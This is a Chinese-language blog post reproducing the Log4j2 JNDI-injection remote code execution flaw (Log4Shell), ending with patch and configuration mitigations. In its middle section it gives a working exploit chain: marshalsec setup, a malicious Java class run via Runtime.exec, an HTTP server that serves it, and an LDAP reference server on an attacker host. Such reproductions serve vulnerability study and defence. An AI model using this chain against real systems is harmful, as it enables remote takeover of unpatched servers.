# Apache Log4j2远程代码执行漏洞复现

## 漏洞原理

log4j2版本 < log4j-2.15.0-rc2 可由JNDI注入实现远程代码执行。

## 影响版本

```
Log4j2.x<=2.14.1
```

## **漏洞复现**

漏洞分析的可以参考逐日实验室的这篇：https://mp.weixin.qq.com/s/1oesQz-UkpqKN3BQH9BKtw

准备环境

把受影响的jar包拖进随手建立的一个java项目，这里部署jar包步骤就不写了，网上一搜傻瓜式教程都有。
![image.png](https://image.3001.net/images/20211210/1639120138_61b2fd0a570348bea045c.png!small)

![image.png](https://image.3001.net/images/20211210/1639120335_61b2fdcf6c16ac0e010cd.png!small)

攻击机环境搭建，这里我用的vps（师兄的，因为我的是Windows。）复现环境的jdk版本最好<=8u191,基于ldap的利用方式，适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。

这里我复现环境的java版本是

![02eda79925d1335ad7ce33bcf254211.png](https://image.3001.net/images/20211212/1639318700_61b604acb244c8d0f429f.png!small)

vps下载marshalsec(我这里已经安装好）：

```
git clone https://github.com/mbechler/marshalsec.git
```

![image.png](https://image.3001.net/images/20211210/1639120182_61b2fd36d4277d17a7ae1.png!small)

然后安装maven：

```
apt-get install maven
```

然后使用maven编译marshalsec成jar包，我们先进入下载的marshalsec文件中运行：

```
mvn clean package -DskipTests
```

都成功后，编译恶意类代码robots.java

再用javac编译成robots.class文件

```
javac robots.java
import java.lang.Runtime;
import java.lang.Process;
public class robots{
 static {
 try {
 Runtime rt = Runtime.getRuntime();
 String[] commands = {"calc.exe"};
 Process pc = rt.exec(commands);
 pc.waitFor();
 } catch (Exception e) {
 // do nothing
 }
 }
}
```

![image.png](https://image.3001.net/images/20211210/1639120195_61b2fd43127cf594009cb.png!small)

搭建http服务传输恶意class文件

```
python -m SimpleHTTPServer 80
```

![45e13ef22cd9954b27afb68b660169d.png](https://image.3001.net/images/20211210/1639120690_61b2ff324a9fba01c9357.png!small)

然后我们借助marshalsec项目，启动一个LDAP服务器，监听9999端口，这里的ip为vps的ip

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://x.x.x.x/#robots" 9999
```

![image.png](https://image.3001.net/images/20211210/1639120214_61b2fd56f2a7c8ba037b2.png!small)

成功执行
![image.png](https://image.3001.net/images/20211210/1639120222_61b2fd5e9e6552f210bec.png!small)

跟fastjson复现步骤差不多，可以参考我fastjson的文章：https://www.freebuf.com/articles/web/283585.html

## 修复方法

截止到目前，网上的修复方法大致是这些：

补丁链接:
https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2

1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；

2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；

3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；